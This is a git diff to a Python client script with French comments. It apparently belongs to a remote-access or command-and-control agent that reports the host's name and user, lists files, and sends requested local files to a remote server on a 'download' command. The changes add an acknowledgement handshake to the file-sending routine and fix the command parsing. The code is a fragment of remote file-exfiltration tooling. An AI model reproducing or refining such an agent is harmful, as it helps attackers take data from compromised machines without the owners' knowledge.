@@ -17,7 +17,7 @@ def get_system_info():
     hostname = socket.gethostname()
     username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
 
-    # TODO : supporter linux??
+    # TODO : supporter linux et windows ??
     # Pour system info c'est facile avec les variable env USER et NAME
 
 
@@ -50,21 +50,29 @@ def send_file(client_socket, filename):
     Send a file to the server in chunks
     """
     if not os.path.isfile(filename):
+        print(f"[-] Error file {filename} not found.")
         client_socket.sendall(f"ERROR: File '{filename}' not found\n".encode())
         return
     
     try:
         client_socket.sendall(f"FILE_START {filename} {os.path.getsize(filename)}\n".encode())
+        ack = client_socket.recv(1024).decode()
+        if ack == "ACK":
 
-        with open(filename, "rb") as file:
-            while chunk := file.read(BUFFER_SIZE):
-                client_socket.sendall(chunk)
+            with open(filename, "rb") as file:
+                while chunk := file.read(BUFFER_SIZE):
+                    client_socket.sendall(chunk)
 
-        client_socket.sendall("FILE_END\n".encode())
-        print(f"[+] File '{filename}' sent successfully")
-    
+            client_socket.sendall("FILE_END\n".encode())
+            print(f"[+] File '{filename}' sent successfully")
+        else:
+            print(f"[-] No ACK from server, aborting.")
+        
     except Exception as e:
         print(f"ERROR: {str(e)}\n".encode())
+
+    finally:
+        return
 
 
 def main():
@@ -119,9 +127,11 @@ def main():
                 files = format_list_output()
                 client_socket.sendall(f"FILES\n{files}\nEND_FILES\n".encode())
 
-            elif command == "download ":
+            elif command.startswith("download "):
                 filename = command[9:].strip()
+                print(f"[-] Sending {filename} to Dune!")
                 send_file(client_socket, filename)
+
 
             else:
                 client_socket.sendall(f"Unknown command: {command}\n".encode())
@@ -138,3 +148,9 @@ if __name__ == '__main__':
     main()
     
 
+"""
+TODO:
+
+- Est-ce que faire un classe pour le client serait plus efficace ?
+
+"""
